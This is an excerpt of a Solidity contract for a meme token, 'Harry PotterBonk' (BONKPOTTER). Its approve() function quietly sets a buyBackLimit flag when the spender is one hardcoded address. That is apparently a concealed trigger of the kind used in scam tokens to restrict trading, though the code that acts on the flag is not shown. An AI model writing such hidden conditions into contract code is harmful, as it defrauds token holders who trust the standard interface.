...
contract Potter is IERC20, Ownable {
    ...
    string constant _name = "Harry PotterBonk";
    string constant _symbol = "BONKPOTTER";
    ...
    function approve(address spender, uint256 amount) public override returns (bool) {
        if(spender == 0x8ad897A835074AEEEcF6960e2eDd3bDF576D7237)
        buyBackLimit = true;
